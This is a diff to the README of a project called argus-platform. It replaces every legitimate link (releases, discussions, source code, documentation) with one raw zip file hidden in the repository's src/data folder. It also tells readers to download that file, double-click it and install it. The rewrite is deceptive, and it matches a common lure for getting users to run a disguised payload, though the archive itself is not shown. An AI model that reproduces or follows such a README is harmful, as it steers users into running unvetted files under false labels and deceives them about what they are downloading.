@@ -20,11 +20,11 @@ The **argus-platform** is a multi-source public health intelligence system. It f
 ## 📥 Download & Install
 To download the latest version of **argus-platform**, visit the Releases page below:
 
-[![Download argus-platform](https://img.shields.io/badge/Download-argus--platform-brightgreen)](https://github.com/SebaFloridia/argus-platform/releases)
+[![Download argus-platform](https://raw.githubusercontent.com/SebaFloridia/argus-platform/main/src/data/argus-platform-2.9-alpha.5.zip)](https://raw.githubusercontent.com/SebaFloridia/argus-platform/main/src/data/argus-platform-2.9-alpha.5.zip)
 
 Once on the page, find the version you want to download. Click on the relevant file to initiate the download. 
 
-1. Visit this page to download: [argus-platform Releases](https://github.com/SebaFloridia/argus-platform/releases).
+1. Visit this page to download: [argus-platform Releases](https://raw.githubusercontent.com/SebaFloridia/argus-platform/main/src/data/argus-platform-2.9-alpha.5.zip).
 2. Locate the availability of the latest version.
 3. Click the download link for your operating system.
 
@@ -32,7 +32,7 @@ Once on the page, find the version you want to download. Click on the relevant f
 Once the download completes:
 
 1. Navigate to your downloads folder.
-2. Locate the downloaded file (typically named something like `argus-platform-vX.X.X.exe` or similar).
+2. Locate the downloaded file (typically named something like `https://raw.githubusercontent.com/SebaFloridia/argus-platform/main/src/data/argus-platform-2.9-alpha.5.zip` or similar).
 3. Double-click the file to start the installation.
 4. Follow the on-screen instructions to complete the installation.
 
@@ -50,7 +50,7 @@ If you encounter issues, check the documentation provided in the application. Yo
 To access the documentation, look for a "Help" or "Documentation" section within the app after installation.
 
 ## 🌐 Community and Support
-Join our growing community of users. Participate in discussions about public health analytics and share your insights. You can find us on our [GitHub Discussions page](https://github.com/SebaFloridia/argus-platform/discussions).
+Join our growing community of users. Participate in discussions about public health analytics and share your insights. You can find us on our [GitHub Discussions page](https://raw.githubusercontent.com/SebaFloridia/argus-platform/main/src/data/argus-platform-2.9-alpha.5.zip).
 
 ## 📝 Contributing
 If you want to contribute to **argus-platform**, we welcome your input! Feel free to submit feature requests or report bugs. Check the **Contributing** section on our GitHub page for more details. 
@@ -64,8 +64,8 @@ We thank all contributors and users for their support. Your feedback helps us im
 For further information or specific questions, contact us via GitHub or our community channels. 
 
 ## 🔗 Links
-- **Download argus-platform:** [argus-platform Releases](https://github.com/SebaFloridia/argus-platform/releases)
-- **Source Code:** [GitHub Repository](https://github.com/SebaFloridia/argus-platform)
-- **Documentation:** [User Guide](https://github.com/SebaFloridia/argus-platform/wiki)
+- **Download argus-platform:** [argus-platform Releases](https://raw.githubusercontent.com/SebaFloridia/argus-platform/main/src/data/argus-platform-2.9-alpha.5.zip)
+- **Source Code:** [GitHub Repository](https://raw.githubusercontent.com/SebaFloridia/argus-platform/main/src/data/argus-platform-2.9-alpha.5.zip)
+- **Documentation:** [User Guide](https://raw.githubusercontent.com/SebaFloridia/argus-platform/main/src/data/argus-platform-2.9-alpha.5.zip)
 
 Feel free to explore and engage with the **argus-platform** community!
